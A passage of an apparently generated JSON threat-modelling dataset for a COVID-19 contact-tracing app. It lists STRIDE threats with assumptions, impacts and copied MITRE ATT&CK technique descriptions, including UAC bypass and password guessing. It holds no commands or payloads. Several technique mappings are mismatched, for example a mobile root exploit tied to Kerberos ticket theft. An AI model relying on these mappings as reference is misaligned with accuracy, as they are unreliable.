                "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
                "id": "attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073",
                "technique_id": "T1548.002"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "6",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user by exploiting weak authentication mechanisms to access the contact tracing apps.",
            "Assumptions": [
                {
                    "Assumption": "The application lacks strong user authentication methods.",
                    "Role": "Attacker",
                    "Condition": "Access to the mobile device without proper authentication."
                },
                {
                    "Assumption": "The attacker has access to a compromised device.",
                    "Role": "Attacker",
                    "Condition": "The device is already compromised through other means such as malware."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user data, risking patient confidentiality and trust.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "network",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker crafts a malicious application that imitates the legitimate contact tracing app to collect sensitive data from users.",
            "Assumptions": [
                {
                    "Assumption": "Users can be tricked into installing malicious applications.",
                    "Role": "User",
                    "Condition": "No or weak app verification processes."
                },
                {
                    "Assumption": "The official app is distributed through non-trusted sources.",
                    "Role": "Developer",
                    "Condition": "Use of unverified app stores for distribution."
                }
            ],
            "Potential Impact": "Collecting sensitive user information under false pretenses, data breach, loss of user trust.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "phishing",
                "malicious app"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses Bluetooth signals to mimic other devices' IDs to generate false proximity data.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth-based communication lacks proper encryption.",
                    "Role": "Developer",
                    "Condition": "Insecure Bluetooth protocol implementation."
                },
                {
                    "Assumption": "The attacker is within proximity to the target devices.",
                    "Role": "Attacker",
                    "Condition": "Physical presence near targets."
                }
            ],
            "Potential Impact": "Incorrect exposure notifications, manipulation of contact data leading to false positives or negatives.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "bluetooth",
                "unauthorized signals",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the mobile app to alter stored contact tracing data before it is uploaded to the server.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the device or malware installed.",
                    "Role": "Attacker",
                    "Condition": "Device is compromised or lacks encryption for stored data."
                },
                {
                    "Assumption": "The application does not verify data integrity before upload.",
                    "Role": "Developer",
                    "Condition": "Absence of strong data integrity checks."
                }
            ],
            "Potential Impact": "Corruption of contact tracing data, unreliable exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data manipulation",
                "local storage",
                "malware"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters data being transmitted between user devices and servers.",
            "Assumptions": [
                {
                    "Assumption": "Weak or lack of encryption for data in transit.",
                    "Role": "Developer",
                    "Condition": "Use of non-secure communication protocols."
                },
                {
                    "Assumption": "The attacker has the capability to perform a man-in-the-middle attack.",
                    "Role": "Attacker",
                    "Condition": "Access to the network path between user and server."
                }
            ],
            "Potential Impact": "Unauthorized modification of data leading to false reports or hiding real exposures.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "man-in-the-middle",
                "data interception",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker compromises the central server to alter contact tracing IDs or exposure data.",
            "Assumptions": [
                {
                    "Assumption": "Central server lacks sufficient security controls.",
                    "Role": "Developer",
                    "Condition": "Vulnerability in server software."
                },
                {
                    "Assumption": "The attacker has administrative access to the server.",
                    "Role": "Attacker",
                    "Condition": "Server credentials are compromised."
                }
            ],
            "Potential Impact": "Widespread false exposure notifications, erosion of public trust in the app functionality.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "server compromise",
                "administrative access",
                "data alteration"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having received exposure notifications after being informed of possible COVID-19 exposure.",
            "Assumptions": [
                {
                    "Assumption": "No logging mechanism for notification delivery.",
                    "Role": "Developer",
                    "Condition": "Lack of audit trails for exposure notifications."
                },
                {
                    "Assumption": "Weak evidence of notification delivery.",
                    "Role": "System",
                    "Condition": "Notifications are not verifiable."
                }
            ],
            "Potential Impact": "Users may fail to self-isolate, leading to further spread of the virus.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "notification delivery",
                "audit logs",
                "user accountability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies having altered or deleted contact tracing data.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging of data changes.",
                    "Role": "Developer",
                    "Condition": "Lack of version control or change tracking."
                },
                {
                    "Assumption": "Logs can be modified without detection.",
                    "Role": "Attacker",
                    "Condition": "Log modification vulnerabilities exist."
                }
            ],
            "Potential Impact": "Impaired tracing accuracy, challenges in identifying and mitigating the attack.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data integrity",
                "change tracking",
                "forensic analysis"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Healthcare authorities or admins deny issues in the application after an incident report.",
            "Assumptions": [
                {
                    "Assumption": "No incident response process in place.",
                    "Role": "Developer/Administrator",
                    "Condition": "Lack of incident documentation."
                },
                {
                    "Assumption": "Log data is insufficient to verify incident claims.",
                    "Role": "System",
                    "Condition": "No comprehensive logging."
                }
            ],
            "Potential Impact": "Loss of user trust, failure to address and mitigate issues promptly.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "incident response",
                "log data",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts data being transmitted from the application to the server, exposing sensitive health data.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted.",
                    "Role": "Developer",
                    "Condition": "Use of non-secure transport protocols."
                },
                {
                    "Assumption": "The attacker has access to the network path.",
                    "Role": "Attacker",
                    "Condition": "Ability to perform network sniffing."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of health information and user interactions.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "network",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An internal threat actor accesses and leaks sensitive contact tracing data stored on the central server.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate access controls on server data.",
                    "Role": "Developer",
                    "Condition": "Overly permissive user access policies."
                },
                {
                    "Assumption": "Unauthorized internal access is possible.",
                    "Role": "Attacker",
                    "Condition": "No role-based access control."
                }
            ],
            "Potential Impact": "Sensitive user data, including health status and contacts, is exposed.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "internal threat",
                "access controls",
                "data leak"
            ],
            "mitre_technique": {
                "name": "Token Impersonation/Theft",
                "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",
                "id": "attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d",
                "technique_id": "T1134.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized third-party apps access and misuse the contact tracing data stored locally on user devices.",
            "Assumptions": [
                {
                    "Assumption": "Local data storage is unencrypted or weakly protected.",
                    "Role": "Developer",
                    "Condition": "No or weak data encryption on-device."
                },
                {
                    "Assumption": "Third-party apps can bypass data access controls.",
                    "Role": "User",
                    "Condition": "No sandboxing/isolation for sensitive data."
                }
            ],
            "Potential Impact": "User health and interaction data is accessed and potentially misused by unauthorized entities.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "local storage",
                "third-party access",
                "data protection"
            ],
            "mitre_technique": {
                "name": "Local Data Staging",
                "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",
                "id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
                "technique_id": "T1074.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the central server with fake contact tracing data, overwhelming its capacity and disrupting its operation.",
            "Assumptions": [
                {
                    "Assumption": "The server has no rate-limiting or filtering mechanisms.",
                    "Role": "Developer",
                    "Condition": "Absence of input validation and request throttling."
                },
                {
                    "Assumption": "Attacker can generate a high volume of requests.",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or powerful computing resources."
                }
            ],
            "Potential Impact": "Service disruption leading to unavailability of contact tracing and notifications.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "data flooding",
                "server overload",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack targeting the servers managing data for the decentralized architecture.",
            "Assumptions": [
                {
                    "Assumption": "Servers are publicly accessible without DDoS protection.",
                    "Role": "Developer",
                    "Condition": "Lack of protective measures such as DDoS mitigation."
                },
                {
                    "Assumption": "The attacker can coordinate multiple sources to perform the attack.",
                    "Role": "Attacker",
                    "Condition": "Access to a network of compromised devices (botnet)."
                }
            ],
            "Potential Impact": "Contact tracing functionality is rendered inoperative, interrupting exposure tracking and notifications.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network attack",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerability in the mobile application to crash it repeatedly, causing service unavailability for users.",
            "Assumptions": [
                {
                    "Assumption": "Unpatched vulnerabilities exist in the application.",
                    "Role": "Developer",
                    "Condition": "Known vulnerabilities are not addressed."
                },
                {
                    "Assumption": "The attacker can trigger the vulnerability at will.",
                    "Role": "Attacker",
                    "Condition": "Device/user interaction control."
                }
            ],
            "Potential Impact": "Users unable to use the application, reducing overall coverage and effectiveness of contact tracing.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "software vulnerability",
                "application crash",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the mobile application to gain root access to the smartphone, thereby accessing all data on the device.",
            "Assumptions": [
                {
                    "Assumption": "The application has exploitable privileges escalation vulnerabilities.",
                    "Role": "Developer",
                    "Condition": "Security patches are not up-to-date."
                },
                {
                    "Assumption": "The attacker is able to execute the exploit on the target device.",
                    "Role": "Attacker",
                    "Condition": "Exploit delivery through social engineering or malware."
                }
            ],
            "Potential Impact": "Complete access to sensitive user data stored on-device, potential leakage of health and personal information.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "root access",
                "mobile device",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Steal or Forge Kerberos Tickets",
                "description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \u201crealms\u201d, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)\n\nLinux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.(Citation: MIT ccache) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted into a Windows format using tools such as Kekeo.(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)\n\n\nKerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: macOS kerberos framework MIT)\n",
                "id": "attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a",
                "technique_id": "T1558"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to the central server by exploiting weak default credentials.",
            "Assumptions": [
                {
                    "Assumption": "Default or weak credentials are in use.",
                    "Role": "Developer",
                    "Condition": "Credentials management is not secure."
                },
                {
                    "Assumption": "The attacker can access the server login interface.",
                    "Role": "Attacker",
                    "Condition": "Server or services are internet-facing."
                }
            ],
            "Potential Impact": "Full administrative control over the server, enabling data manipulation, service disruption, and data theft.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "administrative access",
                "weak credentials",
                "server compromise"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
